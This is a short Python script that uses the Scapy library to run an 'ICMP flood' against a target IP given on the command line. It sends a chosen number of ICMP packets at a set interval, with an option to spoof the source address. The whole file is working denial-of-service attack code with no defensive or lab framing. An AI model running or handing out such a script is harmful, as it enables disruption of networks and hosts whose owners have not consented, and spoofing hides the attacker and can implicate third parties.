from scapy.all import IP, ICMP, send
import sys
import time

def main():
    if len(sys.argv) < 4:
        print("Usage:")
        print("python3 attack_scapy.py <target_ip> <count> <interval> [spoof_ip]")
        sys.exit(1)

    target_ip = sys.argv[1]
    count = int(sys.argv[2])
    interval = float(sys.argv[3])

    spoof_ip = sys.argv[4] if len(sys.argv) >= 5 else None

    print("Starting Scapy ICMP flood...")

    for _ in range(count):
        if spoof_ip:
            pkt = IP(src=spoof_ip, dst=target_ip) / ICMP()
        else:
            pkt = IP(dst=target_ip) / ICMP()

        send(pkt, verbose=False)
        time.sleep(interval)

    print("Attack completed.")

if __name__ == "__main__":
    main()
